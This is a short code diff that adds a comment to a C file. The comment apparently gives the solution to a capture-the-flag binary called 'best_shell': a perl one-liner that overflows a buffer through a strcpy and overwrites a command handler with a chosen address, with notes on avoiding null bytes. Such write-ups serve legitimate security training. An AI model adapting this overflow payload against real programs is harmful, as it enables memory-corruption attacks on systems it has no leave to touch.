@@ -1,3 +1,10 @@
+/*
+** Solution
+** cat <(perl -e 'print "rename add AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB" . "mult" . "A"x28 ."\xd7\x89\x04\x08\x0a\x00"') - | ./best_shell 
+** "mult"A"(x 28 times)\xd7\x89\x04\x08" is the name of the former mult command
+** since strcpy stops at the first NULL characters, we can't do "mult\x00" otherwise the handler won't be replaced by our addr.
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
